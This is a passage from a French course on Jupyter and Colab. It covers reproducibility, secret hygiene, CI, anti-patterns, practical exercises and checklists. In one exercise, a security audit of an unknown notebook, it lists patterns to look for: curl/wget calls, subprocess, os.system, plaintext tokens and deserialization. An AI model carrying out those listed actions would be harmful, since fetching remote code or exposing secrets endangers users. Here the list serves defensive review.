copie locale runtime
       |
       v
entraînement
```

Selon le projet, utiliser :

- archives tar ;
- Parquet ;
- Arrow ;
- WebDataset ;
- streaming de dataset ;
- stockage objet.

Le format dépend des accès nécessaires.

---

# 40. Notebooks et données sensibles

## 40.1 Jupyter local

Lorsque Jupyter tourne sur `localhost`, les données restent normalement sur la machine sauf si le code les transmet explicitement à un service distant.

## 40.2 Colab

Colab exécute le notebook sur une infrastructure distante Google. Avant d'y traiter des données sensibles, vérifier :

- politique de l'organisation ;
- RGPD ;
- localisation et contractualisation ;
- données de santé ou secrets industriels ;
- règles de sécurité internes.

Un notebook pratique n'annule pas les exigences de gouvernance des données.

Voir [[Règlement Général sur la Protection des Données (RGPD)]].

---

# 41. Nettoyer les sorties sensibles

Un notebook peut conserver une information sensible dans une **sortie**, même après suppression du code qui l'a produite.

Avant publication :

1. rechercher secrets et tokens ;
2. nettoyer les sorties ;
3. vérifier les métadonnées ;
4. inspecter le diff Git ;
5. régénérer si nécessaire.

Exemple :

```bash
jupyter nbconvert \
  --ClearOutputPreprocessor.enabled=True \
  --inplace publication.ipynb
```

Un secret déjà commité dans Git doit être **révoqué** ; le supprimer uniquement du dernier commit ne suffit pas.

---

# 42. Notebook « Restart and Run All » comme test minimal

Avant de partager :

```text
[ ] Kernel redémarré
[ ] Toutes les cellules exécutées dans l'ordre
[ ] Aucun état manuel caché
[ ] Dépendances documentées
[ ] Données accessibles
[ ] Aucun secret
[ ] Résultats importants exportés
[ ] Conclusion cohérente avec les sorties
```

Ce contrôle simple détecte une grande partie des notebooks non reproductibles.

---

# 43. Papermill et notebooks paramétrés

Pour automatiser des variantes d'un notebook, **Papermill** peut injecter des paramètres et exécuter le document.

Installation :

```bash
python -m pip install papermill
```

Exemple :

```bash
papermill analyse.ipynb analyse-france.ipynb \
  -p country France \
  -p year 2026
```

Cela peut convenir pour :

- rapports paramétrés ;
- expérimentations ;
- analyses reproductibles simples.

Pour des pipelines complexes, préférer un orchestrateur ou un programme conçu pour cet usage.

---

# 44. Notebooks dans une CI

Une CI peut vérifier qu'un notebook s'exécute réellement.

Exemple conceptuel :

```bash
jupyter nbconvert \
  --execute \
  --to notebook \
  --inplace notebooks/tutorial.ipynb
```

Mais attention :

- temps de calcul ;
- GPU indisponible ;
- accès réseau ;
- datasets ;
- secrets ;
- variabilité des résultats.

Il est souvent utile de séparer :

```text
tests unitaires rapides
       +
notebook smoke-test
       +
expérience lourde optionnelle
```

---

# 45. Jupyter Book, Quarto et publication

Un notebook peut devenir la source d'une documentation ou d'un rapport.

Outils possibles :

- nbconvert ;
- Jupyter Book ;
- Quarto ;
- MkDocs avec plugins appropriés ;
- Sphinx.

L'objectif est de séparer :

- calcul ;
- source éditoriale ;
- format de publication.

Pour un document publié, éviter de dépendre uniquement de l'affichage interactif local.

---

# 46. Notebook vs script Python

| Critère | Notebook | Script/module |
| --- | --- | --- |
| Exploration | Excellent | Correct |
| Narration | Excellent | Faible |
| Visualisation interactive | Excellent | Variable |
| Tests unitaires | Possible mais moins naturel | Excellent |
| Git diff | Médiocre sans outils | Excellent |
| Réutilisation | Moyenne | Excellente |
| Production | À éviter comme cœur du système | Adapté |
| Enseignement | Excellent | Complémentaire |

Le choix n'est pas exclusif. Un bon projet utilise souvent **les deux**.

---

# 47. Notebook vs IDE

Jupyter ne remplace pas un IDE complet pour tous les usages.

Un IDE comme VS Code ou PyCharm est souvent préférable pour :

- refactoring important ;
- navigation multi-fichiers ;
- tests ;
- debug de grosses applications ;
- revues Git ;
- architecture de packages.

Jupyter est préférable pour :

- manipulations interactives ;
- data exploration ;
- démonstrations ;
- notebooks pédagogiques.

VS Code sait d'ailleurs éditer des `.ipynb`, ce qui permet de combiner les deux approches.

---

# 48. Anti-patterns fréquents

## 48.1 Notebook de 20 000 lignes

Symptôme : tout le projet est contenu dans un seul fichier `.ipynb`.

Correction : extraire fonctions, classes et configuration dans des modules.

## 48.2 Installation au milieu du notebook

Symptôme :

```python
# cellule 48
%pip install package
```

Correction : mettre les dépendances au début ou dans un fichier d'environnement.

## 48.3 `!pip` avec mauvais Python

Préférer `%pip`.

## 48.4 `!cd`

Préférer `%cd`.

## 48.5 Secret en clair

Utiliser secrets/variables d'environnement.

## 48.6 Résultat dépendant d'une cellule exécutée hier

Redémarrer et exécuter tout.

## 48.7 Télécharger manuellement un fichier sans documenter sa source

Créer une fonction ou une étape reproductible de téléchargement.

## 48.8 Utiliser Drive comme disque haute performance

Copier les données localement dans le runtime pour les traitements intensifs.

## 48.9 Supposer un GPU précis dans Colab

Détecter le matériel réellement attribué.

## 48.10 Traiter un notebook reçu comme un PDF

Un notebook peut exécuter du code arbitraire. Le relire avant exécution.

---

# 49. Modèle de notebook reproductible

## 49.1 Titre et objectif

```markdown
# Analyse des ventes

Objectif : mesurer l'évolution mensuelle des ventes 2024–2026.
```

## 49.2 Imports

```python
from pathlib import Path

import pandas as pd
import matplotlib.pyplot as plt
```

## 49.3 Configuration

```python
DATA_FILE = Path("data/sales.parquet")
RESULTS_DIR = Path("results")
RESULTS_DIR.mkdir(exist_ok=True)
```

## 49.4 Chargement

```python
sales = pd.read_parquet(DATA_FILE)
sales.head()
```

## 49.5 Validation

```python
assert not sales.empty
assert {"date", "amount"}.issubset(sales.columns)
```

## 49.6 Analyse

```python
monthly = (
    sales.assign(month=sales["date"].dt.to_period("M"))
    .groupby("month", as_index=False)["amount"]
    .sum()
)
monthly.head()
```

## 49.7 Export

```python
monthly.to_csv(RESULTS_DIR / "monthly.csv", index=False)
```

## 49.8 Conclusion

Une cellule Markdown explique ce que montrent réellement les résultats, avec les limites de l'analyse.

---

# 50. TP 1 — Premier notebook local

Objectifs :

1. créer `.venv` ;
2. installer JupyterLab ;
3. lancer `jupyter lab` ;
4. créer un notebook ;
5. exécuter Python ;
6. ajouter Markdown et formule ;
7. enregistrer puis redémarrer le kernel.

Vérifications :

```python
import sys
print(sys.executable)
```

---

# 51. TP 2 — Créer un kernel dédié

Créer deux environnements Python :

```text
.venv-data
.venv-ml
```

Installer dans chacun un `ipykernel` avec un nom distinct puis observer le résultat de :

```python
import sys
print(sys.executable)
```

Comprendre qu'un notebook ne « contient » pas son environnement Python.

---

# 52. TP 3 — État caché

Créer volontairement un notebook dont le résultat change selon l'ordre d'exécution.

Puis :

1. identifier l'état caché ;
2. refactoriser ;
3. faire Restart + Run All ;
4. vérifier l'exécution déterministe.

---

# 53. TP 4 — Analyse de données

Avec pandas :

1. charger un CSV ;
2. inspecter les types ;
3. traiter les valeurs manquantes ;
4. produire un agrégat ;
5. créer un graphique ;
6. exporter le résultat ;
7. documenter les hypothèses.

Voir [[Pandas]].

---

# 54. TP 5 — Git et notebook

1. créer un dépôt Git ;
2. ajouter un notebook ;
3. exécuter une cellule créant une grosse sortie ;
4. observer le diff ;
5. installer `nbdime` ;
6. nettoyer les sorties ;
7. comparer les diffs.

---

# 55. TP 6 — Notebook automatisé

Créer un notebook d'analyse puis l'exécuter sans interface :

```bash
jupyter nbconvert \
  --execute \
  --to notebook \
  --output build/report.ipynb \
  notebooks/report.ipynb
```

Le TP est réussi uniquement si le notebook s'exécute depuis un kernel neuf.

---

# 56. TP 7 — Colab et stockage éphémère

Dans Colab :

1. créer `/content/demo.txt` ;
2. monter Drive ;
3. copier une version sur Drive ;
4. redémarrer/supprimer le runtime ;
5. comparer ce qui persiste.

Objectif : comprendre la séparation **notebook / VM / stockage persistant**.

---

# 57. TP 8 — GPU Colab

1. demander un runtime GPU ;
2. exécuter `nvidia-smi` ;
3. vérifier `torch.cuda.is_available()` ;
4. créer un tenseur CPU ;
5. créer un tenseur GPU ;
6. mesurer une multiplication matricielle ;
7. revenir sur CPU si aucun GPU n'est réellement nécessaire.

---

# 58. TP 9 — Reprise après interruption

Créer une boucle d'entraînement factice de 100 étapes.

Toutes les 10 étapes :

- sauvegarder un checkpoint ;
- écrire le numéro d'étape ;
- pouvoir reprendre après redémarrage.

Objectif : ne jamais concevoir un entraînement Colab dépendant d'une session ininterrompue.

---

# 59. TP 10 — Audit de sécurité d'un notebook

Prendre un notebook inconnu et rechercher :

- `!curl` / `!wget` ;
- `subprocess` ;
- `os.system` ;
- suppressions de fichiers ;
- accès réseau ;
- tokens en clair ;
- désérialisation ;
- installation de paquets ;
- HTML/JavaScript ;
- chemins vers des données privées.

Ne pas exécuter le notebook avant la revue.

---

# 60. TP 11 — Jupytext

Installer :

```bash
python -m pip install jupytext
```

Créer un notebook pairé avec un fichier texte et observer :

- qualité du diff Git ;
- synchronisation ;
- avantages et limites.

---

# 61. TP 12 — Projet final

Construire un petit projet de data science avec :

```text
project/
├── pyproject.toml
├── README.md
├── data/
├── notebooks/
│   ├── 01-exploration.ipynb
│   └── 02-report.ipynb
├── src/
│   └── project/
│       ├── __init__.py
│       └── analysis.py
├── tests/
│   └── test_analysis.py
└── results/
```

Contraintes :

- environnement reconstruisible ;
- pas de secret ;
- notebook exécutable de haut en bas ;
- code métier testé dans `src/` ;
- résultats exportés ;
- Git propre ;
- README indiquant comment reproduire l'analyse ;
- version Colab facultative permettant d'exécuter la démonstration.

---

# 62. Checklist Jupyter

Avant de publier un notebook :

```text
[ ] Le kernel correct est utilisé
[ ] Les dépendances sont documentées
[ ] Restart + Run All fonctionne
[ ] Les cellules suivent un ordre logique
[ ] Les données sources sont identifiées
[ ] Les sorties énormes sont supprimées
[ ] Aucun secret n'est présent
[ ] Les résultats importants sont exportés
[ ] Le code réutilisable est extrait dans des modules
[ ] Les fonctions importantes sont testées
[ ] Les chemins ne dépendent pas d'une machine personnelle
[ ] Le notebook ne suppose pas un état antérieur du kernel
```

# 63. Checklist Colab

```text
[ ] Le notebook reconstruit ses dépendances
[ ] Les fichiers importants sont stockés hors de /content
[ ] Les checkpoints sont réguliers
[ ] Le matériel est détecté au runtime
[ ] Aucun type de GPU précis n'est supposé
[ ] Le code fonctionne sans GPU lorsqu'il n'en a pas besoin
[ ] Drive n'est pas utilisé comme disque de training intensif
[ ] Les secrets utilisent un mécanisme dédié
[ ] Le notebook respecte les règles d'utilisation Colab
[ ] Une interruption de session n'entraîne pas la perte du projet
```

---

# 64. Glossaire

**Cellule**
Unité de contenu d'un notebook.

**Kernel**
Processus exécutant le code.

**Frontend**
Interface utilisateur qui dialogue avec le kernel.

**Jupyter Server**
Serveur gérant notamment fichiers, sessions et kernels.

**IPython**
Environnement Python interactif utilisé notamment par le kernel Python.

**IPykernel**
Kernel Python officiel de l'écosystème Jupyter.

**Kernel spec**
Description permettant à Jupyter de démarrer un kernel.

**Magic command**
Commande IPython commençant généralement par `%` ou `%%`.

**Runtime Colab**
Machine virtuelle/processus de calcul distant associé à une session Colab.

**Notebook trust**
Mécanisme Jupyter limitant l'affichage/exécution automatique de sorties actives non approuvées.

**nbconvert**
Outil de conversion et d'exécution de notebooks.

**Jupytext**
Outil permettant de représenter/synchroniser des notebooks sous forme de fichiers texte.

**nbdime**
Outils de diff et merge adaptés aux notebooks.

---

# 65. Points essentiels à retenir

1. **Le fichier `.ipynb` n'est pas le kernel.**
2. **Le kernel possède un état en mémoire.**
3. **Un notebook reproductible doit fonctionner après Restart + Run All.**
4. **`%pip` est préférable à `!pip` dans un notebook IPython.**
5. **`%cd` modifie le répertoire du kernel ; `!cd` ne le fait pas durablement.**
6. **Le code stable doit progressivement sortir du notebook vers des modules testables.**
7. **Un notebook inconnu est du code inconnu : ne pas l'exécuter aveuglément.**
8. **Le stockage local de Colab est éphémère.**
9. **Les GPU/TPU et limites Colab sont dynamiques et non garantis.**
10. **Drive est un stockage persistant pratique, pas un disque local haute performance.**
11. **Git et les notebooks nécessitent des pratiques spécifiques pour garder des diffs lisibles.**
12. **Le notebook est excellent pour explorer et expliquer ; il ne doit pas devenir par défaut toute l'architecture d'une application.**

---

# 66. Références officielles

## Jupyter

- Project Jupyter : <https://jupyter.org/>
- Jupyter Notebook : <https://jupyter-notebook.readthedocs.io/>
- JupyterLab : <https://jupyterlab.readthedocs.io/>
- Jupyter Server : <https://jupyter-server.readthedocs.io/>
- IPython : <https://ipython.readthedocs.io/>
- nbformat : <https://nbformat.readthedocs.io/>
- nbconvert : <https://nbconvert.readthedocs.io/>

## Google Colab

- Colab : <https://colab.research.google.com/>
- FAQ Colab : <https://research.google.com/colaboratory/faq.html>
- Versions des runtimes Colab : <https://research.google.com/colaboratory/runtime-version-faq.html>

## Cours liés

- [[Python]]
- [[Numpy]]
- [[Pandas]]
- [[Pytorch]]
- [[git]]
- [[Markdown]]
- [[Visual studio code]]
- [[Règlement Général sur la Protection des Données (RGPD)]]
